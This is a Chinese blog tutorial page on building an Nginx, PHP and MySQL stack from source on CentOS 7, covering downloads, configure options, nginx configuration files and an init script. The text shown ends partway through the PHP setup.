<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>在CentOS 7下编译安装Nginx&#43;PHP&#43;MySQL环境 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="在CentOS 7下编译安装Nginx&#43;PHP&#43;MySQL环境" />
<meta property="og:description" content="本文转载自：http://www.softeng.cn/?p=156，本文已获得作者授权，未经作者同意，不可转载。
文章目录 1、前言2、准备安装工具2.1、安装make2.2、安装g&#43;&#43;2.3、创建安装目录 3、安装Nginx3.1、下载并解压pcre3.2、下载并解压zlib3.3、下载并解压openssl3.4、为nginx添加用户及组3.5、下载并安装nginx3.7、启动nginx3.8、加入系统环境变量3.9、加入系统服务3.10、设置nginx开机自启动 4、安装php4.1、通过yum命令安装php需要的常用库4.2、下载并安装php4.3、设置php配置文件4.4、设置php-fpm配置文件4.5、启动php-fpm4.6、加入系统环境变量4.7、加入系统服务4.8、设置php-fpm开机自启动 5、安装MySQL5.1、下载并安装cmake5.2、下载并安装ncurses5.3、安装libaio库5.4、为MySQL添加用户及组5.6、设置mysql配置文件5.7、初始化MySQL5.8、使用安全模式启动MySQL5.9、设置MySQL服务开机自启 6、配置Nginx&#43;PHP&#43;MySQL6.1、配置Nginx&#43;PHP6.2、关于MySQL配置的说明 1、前言 本文适合于已经对Linux操作系统具有基本操作经验，并且能够在Linux或Windows上通过一键搭建工具或者yum命令行进行环境搭建的读者，阅读本文需具有一定的专业知识，本文不建议初学者阅读。
本文所描述的是在标准的CentOS 7.2 64位操作系统下，安装Nginx 1.12.2 &#43; PHP 7.1.11 &#43; MySQL 5.7.20环境。采用源码编译安装的方式，虽然较直接使用yum命令安装较为复杂，但是源码安装可以自定义指定安装路径，可以自定义配置安装配套的库和插件，这样服务器运维人员将更清楚自己服务器的情况，从而，在日后的环境、插件的升级和更新操作中，将变得更加简便和容易。
2、准备安装工具 2.1、安装make yum -y install gcc automake autoconf libtool make 2.2、安装g&#43;&#43; yum install gcc gcc-c&#43;&#43; glibc 2.3、创建安装目录 本文是在阿里云服务器上安装，所以在服务器根目录下创建alidata目录，然后在alidata目录里面分别创建server目录、webapps目录和package目录，其中server目录存放所有的服务器软件（本文中所涉及到的nginx、php、mysql等），webapps目录存放所有部署的代码及程序，package目录用来存放安装过程中需要用到的编译后的库文件。
需以root权限，依次执行以下命令
mkdir /alidata mkdir /alidata/package mkdir –p /alidata/server mkdir –p /alidata/webapps mkdir –p /alidata/logs 这里需要说明，上述的server目录，是指环境安装完成后，运行程序所在的目录，并非nginx等程序的源码存放目录，为了方便，本文将下载到的这些运行环境程序的源码统一存放于/root目录下，读者可根据自身情况及喜好，将运行环境程序源码存放于任意不是/alidata/server的目录下。
3、安装Nginx 3.1、下载并解压pcre 官网：http://www.pcre.org/
依次执行以下命令
cd /root/ wget https://sourceforge.net/projects/pcre/files/pcre/8.41/pcre-8.41.tar.gz tar -zxvf pcre-8.41.tar.gz 3.2、下载并解压zlib 官网：http://zlib.net/
依次执行以下命令
cd /root/ wget https://sourceforge." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/06b64ced415a30e3da2bb5df5506f5f5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-05T23:28:38+08:00" />
<meta property="article:modified_time" content="2022-04-05T23:28:38+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">在CentOS 7下编译安装Nginx&#43;PHP&#43;MySQL环境</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>本文转载自：<a href="http://www.softeng.cn/?p=156" rel="nofollow">http://www.softeng.cn/?p=156</a>，本文已获得作者授权，未经作者同意，不可转载。</p> 
<p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#1_3" rel="nofollow">1、前言</a></li><li><a href="#2_6" rel="nofollow">2、准备安装工具</a></li><li><ul><li><a href="#21make_7" rel="nofollow">2.1、安装make</a></li><li><a href="#22g_11" rel="nofollow">2.2、安装g++</a></li><li><a href="#23_15" rel="nofollow">2.3、创建安装目录</a></li></ul> 
  </li><li><a href="#3Nginx_26" rel="nofollow">3、安装Nginx</a></li><li><ul><li><a href="#31pcre_27" rel="nofollow">3.1、下载并解压pcre</a></li><li><a href="#32zlib_35" rel="nofollow">3.2、下载并解压zlib</a></li><li><a href="#33openssl_43" rel="nofollow">3.3、下载并解压openssl</a></li><li><a href="#34nginx_51" rel="nofollow">3.4、为nginx添加用户及组</a></li><li><a href="#35nginx_57" rel="nofollow">3.5、下载并安装nginx</a></li><li><a href="#37nginx_177" rel="nofollow">3.7、启动nginx</a></li><li><a href="#38_187" rel="nofollow">3.8、加入系统环境变量</a></li><li><a href="#39_202" rel="nofollow">3.9、加入系统服务</a></li><li><a href="#310nginx_278" rel="nofollow">3.10、设置nginx开机自启动</a></li></ul> 
  </li><li><a href="#4php_288" rel="nofollow">4、安装php</a></li><li><ul><li><a href="#41yumphp_289" rel="nofollow">4.1、通过yum命令安装php需要的常用库</a></li><li><a href="#42php_294" rel="nofollow">4.2、下载并安装php</a></li><li><a href="#43php_309" rel="nofollow">4.3、设置php配置文件</a></li><li><a href="#44phpfpm_315" rel="nofollow">4.4、设置php-fpm配置文件</a></li><li><a href="#45phpfpm_338" rel="nofollow">4.5、启动php-fpm</a></li><li><a href="#46_348" rel="nofollow">4.6、加入系统环境变量</a></li><li><a href="#47_363" rel="nofollow">4.7、加入系统服务</a></li><li><a href="#48phpfpm_441" rel="nofollow">4.8、设置php-fpm开机自启动</a></li></ul> 
  </li><li><a href="#5MySQL_451" rel="nofollow">5、安装MySQL</a></li><li><ul><li><a href="#51cmake_452" rel="nofollow">5.1、下载并安装cmake</a></li><li><a href="#52ncurses_468" rel="nofollow">5.2、下载并安装ncurses</a></li><li><a href="#53libaio_483" rel="nofollow">5.3、安装libaio库</a></li><li><a href="#54MySQL_489" rel="nofollow">5.4、为MySQL添加用户及组</a></li><li><a href="#56mysql_509" rel="nofollow">5.6、设置mysql配置文件</a></li><li><a href="#57MySQL_570" rel="nofollow">5.7、初始化MySQL</a></li><li><a href="#58MySQL_576" rel="nofollow">5.8、使用安全模式启动MySQL</a></li><li><a href="#59MySQL_585" rel="nofollow">5.9、设置MySQL服务开机自启</a></li></ul> 
  </li><li><a href="#6NginxPHPMySQL_601" rel="nofollow">6、配置Nginx+PHP+MySQL</a></li><li><ul><li><a href="#61NginxPHP_604" rel="nofollow">6.1、配置Nginx+PHP</a></li><li><a href="#62MySQL_648" rel="nofollow">6.2、关于MySQL配置的说明</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="1_3"></a>1、前言</h2> 
<p>本文适合于已经对Linux操作系统具有基本操作经验，并且能够在Linux或Windows上通过一键搭建工具或者yum命令行进行环境搭建的读者，阅读本文需具有一定的专业知识，本文不建议初学者阅读。<br> 本文所描述的是在标准的CentOS 7.2 64位操作系统下，安装Nginx 1.12.2 + PHP 7.1.11 + MySQL 5.7.20环境。采用源码编译安装的方式，虽然较直接使用yum命令安装较为复杂，但是源码安装可以自定义指定安装路径，可以自定义配置安装配套的库和插件，这样服务器运维人员将更清楚自己服务器的情况，从而，在日后的环境、插件的升级和更新操作中，将变得更加简便和容易。</p> 
<h2><a id="2_6"></a>2、准备安装工具</h2> 
<h3><a id="21make_7"></a>2.1、安装make</h3> 
<pre><code class="prism language-bash">yum -y <span class="token function">install</span> gcc automake autoconf libtool <span class="token function">make</span>
</code></pre> 
<h3><a id="22g_11"></a>2.2、安装g++</h3> 
<pre><code class="prism language-bash">yum <span class="token function">install</span> gcc gcc-c++ glibc
</code></pre> 
<h3><a id="23_15"></a>2.3、创建安装目录</h3> 
<p>本文是在阿里云服务器上安装，所以在服务器根目录下创建alidata目录，然后在alidata目录里面分别创建server目录、webapps目录和package目录，其中server目录存放所有的服务器软件（本文中所涉及到的nginx、php、mysql等），webapps目录存放所有部署的代码及程序，package目录用来存放安装过程中需要用到的编译后的库文件。<br> 需以root权限，依次执行以下命令</p> 
<pre><code class="prism language-bash"><span class="token function">mkdir</span> /alidata
<span class="token function">mkdir</span> /alidata/package
<span class="token function">mkdir</span> –p /alidata/server
<span class="token function">mkdir</span> –p /alidata/webapps
<span class="token function">mkdir</span> –p /alidata/logs
</code></pre> 
<p>这里需要说明，上述的server目录，是指环境安装完成后，运行程序所在的目录，并非nginx等程序的源码存放目录，为了方便，本文将下载到的这些运行环境程序的源码统一存放于/root目录下，读者可根据自身情况及喜好，将运行环境程序源码存放于任意不是/alidata/server的目录下。</p> 
<h2><a id="3Nginx_26"></a>3、安装Nginx</h2> 
<h3><a id="31pcre_27"></a>3.1、下载并解压pcre</h3> 
<p>官网：<a href="http://www.pcre.org/" rel="nofollow" title="http://www.pcre.org/">http://www.pcre.org/</a><br> 依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/
<span class="token function">wget</span> https://sourceforge.net/projects/pcre/files/pcre/8.41/pcre-8.41.tar.gz
<span class="token function">tar</span> -zxvf pcre-8.41.tar.gz
</code></pre> 
<h3><a id="32zlib_35"></a>3.2、下载并解压zlib</h3> 
<p>官网：<a href="http://zlib.net/" rel="nofollow" title="http://zlib.net/">http://zlib.net/</a><br> 依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/
<span class="token function">wget</span> https://sourceforge.net/projects/libpng/files/zlib/1.2.11/zlib-1.2.11.tar.gz
<span class="token function">tar</span> –zxvf zlib-1.2.11.tar.gz
</code></pre> 
<h3><a id="33openssl_43"></a>3.3、下载并解压openssl</h3> 
<p>官网：<a href="https://www.openssl.org/" rel="nofollow" title="https://www.openssl.org/">https://www.openssl.org/</a><br> 依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/
<span class="token function">wget</span> https://www.openssl.org/source/openssl-1.1.0b.tar.gz
<span class="token function">tar</span> –zxvf openssl-1.1.0b.tar.gz
</code></pre> 
<h3><a id="34nginx_51"></a>3.4、为nginx添加用户及组</h3> 
<p>nginx的工作进程需要以某一个用户的权限进行运行，为了服务器安全，一般指定一个普通用户权限的账号做为nginx的运行角色，根据个人习惯，这里使用www用户做为nginx工作进程的用户，后续安装的PHP也以www用户做为工作进程用户，依次执行以下命令以创建用户及用户组</p> 
<pre><code class="prism language-shell"><span class="token function">groupadd</span> -r www
<span class="token function">useradd</span> -r -g www www
</code></pre> 
<h3><a id="35nginx_57"></a>3.5、下载并安装nginx</h3> 
<p>官网：<a href="http://nginx.org/" rel="nofollow" title="http://nginx.org/">http://nginx.org/</a><br> 依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/
<span class="token function">wget</span> http://nginx.org/download/nginx-1.12.2.tar.gz
<span class="token function">tar</span> –zxvf nginx-1.12.2.tar.gz
</code></pre> 
<p>以上命令完成下载和解压操作，接下来进行安装操作</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> nginx-1.12.2/
./configure --prefix<span class="token operator">=</span>/alidata/server/nginx-1.12.2 --sbin-path<span class="token operator">=</span>/alidata/server/nginx-1.12.2/sbin/nginx --conf-path<span class="token operator">=</span>/alidata/server/nginx-1.12.2/nginx.conf --pid-path<span class="token operator">=</span>/alidata/server/nginx-1.12.2/nginx.pid --user<span class="token operator">=</span>www --group<span class="token operator">=</span>www --with-http_ssl_module --with-http_flv_module --with-http_mp4_module  --with-http_stub_status_module --with-select_module --with-poll_module --error-log-path<span class="token operator">=</span>/alidata/logs/nginx/error.log --http-log-path<span class="token operator">=</span>/alidata/logs/nginx/access.log  --with-pcre<span class="token operator">=</span>/root/pcre-8.41 --with-zlib<span class="token operator">=</span>/root/zlib-1.2.11 --with-openssl<span class="token operator">=</span>/root/openssl-1.1.0b
<span class="token function">make</span>
<span class="token function">make</span> <span class="token function">install</span>
</code></pre> 
<p>其中，./configure是对安装进行配置；</p> 
<pre><code>--prefix表示nginx要安装到哪个路径下，这里指定刚才新建好的/alidata/server目录下的nginx-1.12.2；
--sbin-path表示nginx的可执行文件存放路径
--conf-path表示nginx的主配置文件存放路径，nginx允许使用不同的配置文件启动，通过命令行中的-c选项
--pid-path表示nginx.pid文件的存放路径，将存储的主进程的进程号。安装完成后，可以随时改变的文件名 ， 在nginx.conf配置文件中使用 PID指令。默认情况下，文件名 为prefix/logs/nginx.pid
--error-log-path表示nginx的主错误、警告、和诊断文件存放路径
--http-log-path表示nginx的主请求的HTTP服务器的日志文件的存放路径
--user表示nginx工作进程的用户
--group表示nginx工作进程的用户组
--with-select_module或--without-select_module表示启用或禁用构建一个模块来允许服务器使用select()方法
--with-poll_module或--without-poll_module表示启用或禁用构建一个模块来允许服务器使用poll()方法
--with-http_ssl_module表示使用https协议模块。默认情况下，该模块没有被构建。建立并运行此模块的OpenSSL库是必需的
--with-pcre表示pcre的源码路径，因为解压后的pcre是放在root目录下的，所以是/root/pcre-8.41；
--with-zlib表示zlib的源码路径，这里因为解压后的zlib是放在root目录下的，所以是/root/zlib-1.2.11
--with-openssl表示openssl库的源码路径
</code></pre> 
<p>配置成功后，依次执行make和make install命令，即可安装Nginx，安装成功后，可以看到在/alidata/server目录下，多出了一个nginx-1.12.2，里面即是nginx的实际运行程序。<br> 3.6、设置nginx配置文件<br> 本文配置的nginx支持多域名，每个域名的配置文件单独放在/alidata/server/nginx-1.12.2/conf/vhosts路径下，使用vim命令打开nginx.conf文件，对其内容进行修改</p> 
<pre><code class="prism language-json">user  www www<span class="token punctuation">;</span>
worker_processes  <span class="token number">2</span><span class="token punctuation">;</span>

error_log  <span class="token operator">/</span>alidata<span class="token operator">/</span>logs<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log crit<span class="token punctuation">;</span>

pid        <span class="token operator">/</span>alidata<span class="token operator">/</span>server<span class="token operator">/</span>nginx<span class="token operator">-</span><span class="token number">1.12</span><span class="token number">.2</span><span class="token operator">/</span>logs<span class="token operator">/</span>nginx<span class="token punctuation">.</span>pid<span class="token punctuation">;</span>
worker_rlimit_nofile <span class="token number">65535</span><span class="token punctuation">;</span>

events <span class="token punctuation">{<!-- --></span>
    use epoll<span class="token punctuation">;</span>
    worker_connections  <span class="token number">65535</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

http <span class="token punctuation">{<!-- --></span>
    include       mime<span class="token punctuation">.</span>types<span class="token punctuation">;</span>
default_type  application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>

access_log  <span class="token operator">/</span>alidata<span class="token operator">/</span>logs<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>

server_names_hash_bucket_size <span class="token number">128</span><span class="token punctuation">;</span>
client_header_buffer_size 32k<span class="token punctuation">;</span>
large_client_header_buffers <span class="token number">4</span> 32k<span class="token punctuation">;</span>
client_max_body_size 8m<span class="token punctuation">;</span>

sendfile        on<span class="token punctuation">;</span>
tcp_nopush     on<span class="token punctuation">;</span>

keepalive_timeout  <span class="token number">65</span><span class="token punctuation">;</span>

gzip  on<span class="token punctuation">;</span>
gzip_min_length  1k<span class="token punctuation">;</span>
gzip_buffers     <span class="token number">4</span> 16k<span class="token punctuation">;</span>
gzip_http_version <span class="token number">1.0</span><span class="token punctuation">;</span>
gzip_comp_level <span class="token number">2</span><span class="token punctuation">;</span>
gzip_types       text<span class="token operator">/</span>plain application<span class="token operator">/</span>x<span class="token operator">-</span>javascript text<span class="token operator">/</span>css application<span class="token operator">/</span>xml<span class="token punctuation">;</span>
gzip_vary on<span class="token punctuation">;</span>

tcp_nodelay on<span class="token punctuation">;</span>

fastcgi_connect_timeout <span class="token number">300</span><span class="token punctuation">;</span>
fastcgi_send_timeout <span class="token number">300</span><span class="token punctuation">;</span>
fastcgi_read_timeout <span class="token number">300</span><span class="token punctuation">;</span>
fastcgi_buffer_size 64k<span class="token punctuation">;</span>
fastcgi_buffers <span class="token number">4</span> 64k<span class="token punctuation">;</span>
fastcgi_busy_buffers_size 128k<span class="token punctuation">;</span>
fastcgi_temp_file_write_size 128k<span class="token punctuation">;</span>

log_format <span class="token string">'$remote_addr - $remote_user [$time_local] "$request" '</span>
              <span class="token string">'$status $body_bytes_sent "$http_referer" '</span>
              <span class="token string">'"$http_user_agent" "$http_x_forwarded_for"'</span><span class="token punctuation">;</span>

include <span class="token operator">/</span>alidata<span class="token operator">/</span>server<span class="token operator">/</span>nginx<span class="token operator">-</span><span class="token number">1.12</span><span class="token number">.2</span><span class="token operator">/</span>conf<span class="token operator">/</span>vhosts<span class="token comment">/*.conf;
include /alidata/server/nginx-1.12.2/conf/proxy/*.conf;
}
</span></code></pre> 
<p>上述配置中，引用了/alidata/server/nginx-1.12.2/conf/vhosts/目录下所有后缀名是.conf的配置文件，现在进入该目录编写一个默认配置文件default.conf，其内容是</p> 
<pre><code class="prism language-json">server <span class="token punctuation">{<!-- --></span>
	listen       <span class="token number">80</span><span class="token punctuation">;</span>
	server_name  localhost<span class="token punctuation">;</span>
	index index<span class="token punctuation">.</span>html<span class="token punctuation">;</span>
	root <span class="token operator">/</span>alidata<span class="token operator">/</span>webapps<span class="token punctuation">;</span>
	location <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>gif<span class="token operator">|</span>jpg<span class="token operator">|</span>jpeg<span class="token operator">|</span>png<span class="token operator">|</span>bmp<span class="token operator">|</span>swf<span class="token punctuation">)</span>$
	<span class="token punctuation">{<!-- --></span>
		expires 30d<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	location <span class="token operator">~</span> <span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span>js<span class="token operator">|</span>css<span class="token punctuation">)</span><span class="token operator">?</span>$
	<span class="token punctuation">{<!-- --></span>
		expires 1h<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	#伪静态规则
	include <span class="token operator">/</span>alidata<span class="token operator">/</span>server<span class="token operator">/</span>nginx<span class="token operator">-</span><span class="token number">1.12</span><span class="token number">.2</span><span class="token operator">/</span>conf<span class="token operator">/</span>rewrite<span class="token operator">/</span><span class="token keyword">default</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
	access_log  <span class="token operator">/</span>alidata<span class="token operator">/</span>logs<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token operator">/</span><span class="token keyword">default</span><span class="token punctuation">.</span>log<span class="token punctuation">;</span>
	error_log <span class="token operator">/</span>alidata<span class="token operator">/</span>logs<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token operator">/</span><span class="token keyword">default</span><span class="token punctuation">.</span>log<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>其中引入了一个/alidata/server/nginx-1.12.2/conf/rewrite/default.conf文件，这个文件是用来编写rewrite规则的配置文件，用来实现伪静态，其内容是</p> 
<pre><code>rewrite ^(.*)-htm-(.*)$ $1.php?$2 last;
rewrite ^(.*)/simple/([a-z0-9\_]+\.html)$ $1/simple/index.php?$2 last;
rewrite ^(.*)/data/(.*)\.(htm|php)$ 404.html last;
rewrite ^(.*)/attachment/(.*)\.(htm|php)$ 404.html last;
rewrite ^(.*)/html/(.*)\.(htm|php)$ 404.html last;
</code></pre> 
<h3><a id="37nginx_177"></a>3.7、启动nginx</h3> 
<p>以本文为例，启动nginx需要执行以下命令</p> 
<pre><code class="prism language-shell">/alidata/server/nginx-1.12.2/sbin/nginx
</code></pre> 
<p>启动后，使用命令</p> 
<pre><code class="prism language-shell"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> nginx
</code></pre> 
<p>查看进程，若能够看到相关进程，则证明启动成功。查询进程时，可以看到进程是以www用户身份执行的</p> 
<h3><a id="38_187"></a>3.8、加入系统环境变量</h3> 
<p>使用vim命令打开/etc/profile文件，在文件最末尾加上如下代码</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">export</span> <span class="token assign-left variable">NGINX_HOME</span><span class="token operator">=</span>/alidata/server/nginx-1.12.2
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span><span class="token builtin class-name">:</span><span class="token variable">$NGINX_HOME</span>/sbin
</code></pre> 
<p>保存修改后，使用source命令重新加载配置文件，命令如下</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">source</span> /etc/profile
</code></pre> 
<p>执行上述命令后，可使用</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
</code></pre> 
<p>命令查看环境变量中是否已经加入了相关的路径</p> 
<h3><a id="39_202"></a>3.9、加入系统服务</h3> 
<p>使用vim命令在/etc/init.d/目录下创建一个nginx文件，命令如下</p> 
<pre><code class="prism language-shell"><span class="token function">vim</span> /etc/init.d/nginx
</code></pre> 
<p>文件内容如下</p> 
<pre><code class="prism language-shell"><span class="token shebang important">#!/bin/bash</span>
<span class="token comment"># chkconfig: - 85 15</span>
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/alidata/server/nginx-1.12.2
<span class="token assign-left variable">DESC</span><span class="token operator">=</span><span class="token string">"nginx daemon"</span>
<span class="token assign-left variable">NAME</span><span class="token operator">=</span>nginx
<span class="token assign-left variable">DAEMON</span><span class="token operator">=</span><span class="token environment constant">$PATH</span>/sbin/<span class="token variable">$NAME</span>
<span class="token assign-left variable">CONFIGFILE</span><span class="token operator">=</span><span class="token environment constant">$PATH</span>/<span class="token variable">$NAME</span>.conf
<span class="token assign-left variable">PIDFILE</span><span class="token operator">=</span><span class="token environment constant">$PATH</span>/logs/<span class="token variable">$NAME</span>.pid
<span class="token assign-left variable">SCRIPTNAME</span><span class="token operator">=</span>/etc/init.d/<span class="token variable">$NAME</span>
<span class="token builtin class-name">set</span> -e
<span class="token punctuation">[</span> -x <span class="token string">"<span class="token variable">$DAEMON</span>"</span> <span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token builtin class-name">exit</span> <span class="token number">0</span>
<span class="token function-name function">do_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token variable">$DAEMON</span> -c <span class="token variable">$CONFIGFILE</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> -n <span class="token string">"nginx already running"</span>
<span class="token punctuation">}</span>
<span class="token function-name function">do_stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token variable">$DAEMON</span> -s stop <span class="token operator">||</span> <span class="token builtin class-name">echo</span> -n <span class="token string">"nginx not running"</span>
<span class="token punctuation">}</span>
<span class="token function-name function">do_reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token variable">$DAEMON</span> -s reload <span class="token operator">||</span> <span class="token builtin class-name">echo</span> -n <span class="token string">"nginx can't reload"</span>
<span class="token punctuation">}</span>
<span class="token keyword">case</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token keyword">in</span>
start<span class="token punctuation">)</span>
<span class="token builtin class-name">echo</span> -n <span class="token string">"Starting <span class="token variable">$DESC</span>: <span class="token variable">$NAME</span>"</span>
do_start
<span class="token builtin class-name">echo</span> <span class="token string">"."</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span>
stop<span class="token punctuation">)</span>
<span class="token builtin class-name">echo</span> -n <span class="token string">"Stopping <span class="token variable">$DESC</span>: <span class="token variable">$NAME</span>"</span>
do_stop
<span class="token builtin class-name">echo</span> <span class="token string">"."</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span>
reload<span class="token operator">|</span>graceful<span class="token punctuation">)</span>
<span class="token builtin class-name">echo</span> -n <span class="token string">"Reloading <span class="token variable">$DESC</span> configuration..."</span>
do_reload
<span class="token builtin class-name">echo</span> <span class="token string">"."</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span>
restart<span class="token punctuation">)</span>
<span class="token builtin class-name">echo</span> -n <span class="token string">"Restarting <span class="token variable">$DESC</span>: <span class="token variable">$NAME</span>"</span>
do_stop
do_start
<span class="token builtin class-name">echo</span> <span class="token string">"."</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span>
*<span class="token punctuation">)</span>
<span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$SCRIPTNAME</span> {start|stop|reload|restart}"</span> <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token number">2</span>
<span class="token builtin class-name">exit</span> <span class="token number">3</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span>
<span class="token keyword">esac</span>
<span class="token builtin class-name">exit</span> <span class="token number">0</span>
</code></pre> 
<p>其中，需要注意几个变量，分别是PATH、NAME、DAEMON、CONFIGFILE、PIDFILE、SCRIPTNAME，其中，PATH设置为nginx的安装路径，DAEMON设置为nginx启动脚本的路径，CONFIGFILE是nginx.conf文件的路径，PIDFILE是进程文件的路径，需要与nginx.conf文件中的配置一致，SCRIPTNAME则是要指向当前文件路径/etc/init.d/nginx<br> 将上述文件保存后，一定要记得给其赋予可执行的权限，具体命令如下</p> 
<pre><code class="prism language-shell"><span class="token function">chmod</span> +x /etc/init.d/nginx
</code></pre> 
<p>至此，我们已将nginx加入了系统服务，由于本文描述的实在CentOS 7环境下安装，所以与CentOS 6不同的是，不再使用类似于</p> 
<pre><code class="prism language-shell"><span class="token function">service</span> nginx start
</code></pre> 
<p>这样的命令来开启或者关闭服务，而是使用如下命令开启和关闭服务</p> 
<pre><code class="prism language-shell">/bin/systemctl start nginx
/bin/systemctl stop nginx
/bin/systemctl reload nginx
</code></pre> 
<p>若此时无法执行以上命令，首先要确认之前打开的nginx进程已被杀死，其次可以尝试先执行</p> 
<pre><code class="prism language-shell">systemctl <span class="token builtin class-name">enable</span> nginx
</code></pre> 
<p>命令，然后再执行上述三个命令。</p> 
<h3><a id="310nginx_278"></a>3.10、设置nginx开机自启动</h3> 
<p>经过上面的操作，nginx已被添加为系统服务，所以可以将其设置为开机自启动，这样就可以避免每次服务器重启之后需要手动开启nginx的操作，具体命令如下</p> 
<pre><code class="prism language-shell"><span class="token function">chkconfig</span> --add nginx
<span class="token function">chkconfig</span> nginx on
</code></pre> 
<p>或者</p> 
<pre><code class="prism language-shell">systemctl <span class="token builtin class-name">enable</span> nginx
</code></pre> 
<h2><a id="4php_288"></a>4、安装php</h2> 
<h3><a id="41yumphp_289"></a>4.1、通过yum命令安装php需要的常用库</h3> 
<p>依次执行以下命令</p> 
<pre><code class="prism language-shell">yum -y <span class="token function">install</span> libmcrypt-devel mhash-devel libxslt-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel <span class="token function">bzip2</span> bzip2-devel ncurses ncurses-devel <span class="token function">curl</span> curl-devel e2fsprogs e2fsprogs-devel krb5 krb5-devel libidn libidn-devel openssl openssl-devel
</code></pre> 
<h3><a id="42php_294"></a>4.2、下载并安装php</h3> 
<p>官网：<a href="http://php.net/" rel="nofollow" title="http://php.net/">http://php.net/</a><br> 依次执行以下命令</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/
<span class="token function">wget</span> http://cn2.php.net/distributions/php-7.1.11.tar.gz
<span class="token function">tar</span> –zxvf php-7.1.11.tar.gz
</code></pre> 
<p>以上命令完成下载和解压操作，接下来进行安装操作</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> /root/php-7.1.11
./configure --prefix<span class="token operator">=</span>/alidata/server/php-7.1.11 --with-config-file-path<span class="token operator">=</span>/alidata/server/php-7.1.11/etc --enable-fpm --with-mcrypt --enable-mbstring --enable-pdo --with-curl --disable-debug  --disable-rpath --enable-inline-optimization --with-bz2  --with-zlib --enable-sockets --enable-sysvsem --enable-sysvshm --enable-pcntl --enable-mbregex --with-mhash --enable-zip --with-pcre-regex --with-mysqli --with-gd --with-jpeg-dir --with-freetype-dir --enable-calendar
<span class="token function">make</span>
<span class="token function">make</span> <span class="token function">install</span>
</code></pre> 
<h3><a id="43php_309"></a>4.3、设置php配置文件</h3> 
<p>将官方提供的配置模板拷贝到配置参数中所指定的目录中</p> 
<pre><code class="prism language-shell"><span class="token function">cp</span> /root/php-7.1.11/php.ini-production /alidata/server/php-7.1.11/etc/php.ini
</code></pre> 
